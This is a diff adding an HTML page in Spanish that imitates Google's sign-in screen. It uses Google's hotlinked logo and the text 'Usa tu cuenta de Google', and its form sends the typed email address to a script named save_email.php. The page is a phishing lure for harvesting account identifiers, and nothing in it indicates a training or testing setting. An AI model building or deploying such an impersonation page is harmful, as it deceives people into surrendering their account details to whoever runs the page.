@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Página de Inicio de Sesión</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Logo de Google">
+        </div>
+        <div class="login-form">
+            <h1>Iniciar sesión</h1>
+            <p>Usa tu cuenta de Google</p>
+            <form action="save_email.php" method="POST">
+                <div class="input-group">
+                    <input type="email" name="email" required placeholder="Correo electrónico">
+                </div>
+                <div class="button-group">
+                    <button type="submit">Siguiente</button>
+                </div>
+            </form>
+            <div class="links">
+                <a href="#">¿Has olvidado tu correo?</a>
+                <a href="#">¿No es tu ordenador? Usa el modo de invitado para iniciar sesión de forma privada.</a>
+                <a href="#">Crear cuenta</a>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
